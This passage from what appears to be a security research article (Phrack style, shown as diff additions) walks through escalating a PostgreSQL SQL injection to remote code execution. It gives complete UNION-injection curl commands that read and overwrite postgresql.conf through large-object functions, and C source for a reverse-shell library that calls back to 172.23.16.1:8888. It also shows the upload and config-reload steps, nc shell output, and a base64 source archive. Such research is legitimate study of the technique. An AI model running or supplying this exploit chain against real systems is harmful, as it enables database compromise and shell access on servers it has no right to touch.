+the "pg_settings" table without any extra path guessing effort:
+
+--------------------------------------------------------------------------
+$ curl -G "http://172.23.16.127:8000/phrases" --data-urlencode \
+"id=-1 UNION SELECT 1337, sourcefile FROM pg_file_settings"
+[
+    {"id":1337,"text":"/etc/postgresql/13/main/postgresql.conf"}
+]
+--------------------------------------------------------------------------
+
+
+Let's download it with the help of previously used Large Object functions:
+
+--------------------------------------------------------------------------
+$ curl -G "http://172.23.16.127:8000/phrases" --data-urlencode \
+"id=-1 UNION SELECT 1337, CAST((SELECT lo_import('/etc/postgresql/13/main/postgresql.conf', 3333331337)) AS text)"
+[
+    {"id":1337,"text":"3333331337"}
+]
+
+$ curl -G "http://172.23.16.127:8000/phrases" --data-urlencode \
+"id=-1 UNION SELECT 1337,translate(encode(lo_get(3333331337), 'base64'), E'\n', '')" | jq ".[].text" -r | base64 -d > postgresql.conf
+--------------------------------------------------------------------------
+
+
+---[ 4.1 - Choosing a parameter to exploit
+
+There are several known options that can already be used for an RCE:
+
+- ssl_passphrase_command (by Denis Andzakovic[5])
+- archive_command (by sylsTyping[6])
+
+But are any other parameters worth looking into?
+
+--------------------------------------------------------------------------
+$ cat postgresql.conf
+...
+# - Shared Library Preloading -
+
+#local_preload_libraries = ''
+#session_preload_libraries = ''
+#shared_preload_libraries = ''	# (change requires restart)
+...
+
+# - Other Defaults -
+
+#dynamic_library_path = '$libdir'
+--------------------------------------------------------------------------
+
+
+These parameters specify libraries to be loaded dynamically by the DBMS
+from the path specified in the "dynamic_library_path" variable, under
+specific conditions. That sounds promising!
+
+We will focus on the "session_preload_libraries" variable, which dictates
+what libraries should be preloaded by the server on a new connection[11].
+It does not require a restart of the server, unlike
+"shared_preload_libraries", and does not have a specific prefix prepended
+to the path like the "local_preload_libraries" variable.
+
+So, we can rewrite the malicious postgresql.conf to have a writable
+directory in the "dynamic_library_path", e.g. /tmp, and to have a
+rogue library filename in the "shared_preload_libraries", e.g.
+"payload.so".
+
+The updated config file will look like this:
+
+--------------------------------------------------------------------------
+$ cat postgresql.conf
+...
+# - Shared Library Preloading -
+session_preload_libraries = 'payload.so'
+...
+
+# - Other Defaults -
+
+dynamic_library_path = '/tmp:$libdir'
+--------------------------------------------------------------------------
+
+
+---[ 4.2 - Compiling the malicious library
+
+One of the final steps is to compile a malicious library for the server to
+load. The code will naturally vary depending on the OS the DBMS is running
+under. For the Unix-like case, let's compile the following simple reverse
+shell into an .so file. The "_init()" function will automatically fire on
+library load:
+
+--------------------------------------------------------------------------
+#include <stdio.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include "postgres.h"
+#include "fmgr.h"
+
+#ifdef PG_MODULE_MAGIC
+PG_MODULE_MAGIC;
+#endif
+
+void _init() {
+    /*
+        code taken from https://www.revshells.com/
+    */
+
+    int port = 8888;
+    struct sockaddr_in revsockaddr;
+
+    int sockt = socket(AF_INET, SOCK_STREAM, 0);
+    revsockaddr.sin_family = AF_INET;
+    revsockaddr.sin_port = htons(port);
+    revsockaddr.sin_addr.s_addr = inet_addr("172.23.16.1");
+
+    connect(sockt, (struct sockaddr *) &revsockaddr,
+    sizeof(revsockaddr));
+    dup2(sockt, 0);
+    dup2(sockt, 1);
+    dup2(sockt, 2);
+
+    char * const argv[] = {"/bin/bash", NULL};
+    execve("/bin/bash", argv, NULL);
+}
+--------------------------------------------------------------------------
+
+
+Notice the presence of the "PG_MODULE_MAGIC" field in the code. It is
+required for the library to be recognized and loaded by the PostgreSQL
+server.
+
+Before compilation, we must install proper PostgreSQL development packages
+for the correct major version, 13 in our case:
+
+--------------------------------------------------------------------------
+$ sudo apt install postgresql-13 postgresql-server-dev-13 -y
+--------------------------------------------------------------------------
+
+
+The code can be compiled with gcc with the following command:
+--------------------------------------------------------------------------
+$ gcc \
+-I$(pg_config --includedir-server) \
+-shared \
+-fPIC \
+-nostartfiles \
+-o payload.so \
+payload.c
+--------------------------------------------------------------------------
+
+
+---[ 4.3 - Uploading the config and library to the server
+
+With the updated config file and compiled library on our hands, it is time
+to upload and overwrite everything on the target DBMS host.
+
+Uploading and replacing the postgresql.conf file:
+
+--------------------------------------------------------------------------
+$ curl -G "http://172.23.16.127:8000/phrases" --data-urlencode \
+"id=-1 UNION SELECT 1337,CAST((SELECT lo_from_bytea(3331333337, decode('$(base64 -w 0 postgresql_new.conf)', 'base64'))) AS text)"
+[
+    {"id":1337,"text":"3331333337"}
+]
+
+$ curl -G "http://172.23.16.127:8000/phrases" --data-urlencode \
+"id=-1 UNION SELECT 1337,CAST((SELECT lo_export(3331333337, '/etc/postgresql/13/main/postgresql.conf')) AS text)"
+[{"id":1337,"text":"1"}]
+--------------------------------------------------------------------------
+
+
+Uploading the malicious .so file:
+
+--------------------------------------------------------------------------
+$ curl -G "http://172.23.16.127:8000/phrases" --data-urlencode \
+"id=-1 UNION SELECT 1337,CAST((SELECT lo_from_bytea(33313333337, decode('$(base64 -w 0 payload.so)', 'base64'))) AS text)"
+[
+    {"id":1337,"text":"33313333337"}
+]
+
+$ curl -G "http://172.23.16.127:8000/phrases" --data-urlencode \
+"id=-1 UNION SELECT 1337,CAST((SELECT lo_export(33313333337, '/tmp/payload.so')) AS text)"
+[{"id":1337,"text":"1"}]
+--------------------------------------------------------------------------
+
+
+If everything is correct, we should see the updated config and .so file in
+place:
+
+--------------------------------------------------------------------------
+# .so library
+=== target server ===
+ubuntu@ubuntu-virtual-machine:/tmp$ md5sum payload.so
+0a240596d100c8ca8e781543884da202  payload.so
+
+=== attacker server ===
+$ md5sum payload.so
+0a240596d100c8ca8e781543884da202  payload.so
+
+
+# postgresql.conf
+=== target server ===
+ubuntu@ubuntu-virtual-machine:~$ md5sum /etc/postgresql/13/main/postgresql.conf
+480bb646f178be2a9a2b609b384e20de  /etc/postgresql/13/main/postgresql.conf
+
+=== attacker server ===
+$ md5sum postgresql_new.conf
+480bb646f178be2a9a2b609b384e20de  postgresql_new.conf
+--------------------------------------------------------------------------
+
+---[ 4.4 - Reload successful
+
+We are all set. Now for the moment of glory! A quick config reload and we
+get a reverse shell back from the server.
+
+--------------------------------------------------------------------------
+$ curl -G "http://172.23.16.127:8000/phrases" --data-urlencode \
+"id=-1 UNION SELECT 1337, CAST((SELECT pg_reload_conf()) AS text)"
+[
+    {"id":1337,"text":"true"}
+]
+--------------------------------------------------------------------------
+
+
+On the attacker host:
+
+--------------------------------------------------------------------------
+$ nc -lvnp 8888
+Listening on 0.0.0.0 8888
+Connection received on 172.23.16.1 53004
+
+id
+uid=129(postgres) gid=138(postgres) groups=138(postgres),115(ssl-cert)
+pwd
+/var/lib/postgresql
+--------------------------------------------------------------------------
+
+
+--[ 5 - Conclusions
+
+In this article, we managed to escalate the impact of a seemingly very
+restricted SQL injection to a critical level by recreating DELETE and
+UPDATE statements from scratch via the direct modification of the DBMS
+files and data, and develop a novel technique of escalating user
+permissions!
+
+Excessive server file read/write permissions can be a powerful tool in
+the wrong hands. There is still much to discover with this attack vector,
+but I hope you've learned something useful today.
+
+Cheers,
+adeadfed
+
+
+--[ 6 - References
+[0]  https://github.com/gin-gonic/gin
+[1]  https://github.com/jackc/pgx
+[2]  https://github.com/jackc/pgx/issues/1090
+[3]  https://github.com/postgres/postgres/blob/2346df6fc373df9c5ab944eebecf7d3036d727de/src/backend/tcop/postgres.c#L1468
+[4]  https://www.postgresql.org/docs/current/lo-funcs.html
+[5]  https://pulsesecurity.co.nz/articles/postgres-sqli
+[6]  https://thegrayarea.tech/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3
+[7]  https://www.postgresql.org/docs/9.4/functions-admin.html
+[8]  https://www.postgresql.org/docs/current/storage-hot.html
+[9]  https://www.postgresql.org/docs/current/storage-page-layout.html
+[10] https://github.com/adeadfed/postgresql-filenode-editor
+[11] https://postgresqlco.nf/doc/en/param/session_preload_libraries/
+[12] https://www.manniwood.com/2020_12_21/read_pg_from_go.html
+
+
+--[ 7 - Source code
+
+base64 -w 75 sources.tar.gz
+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
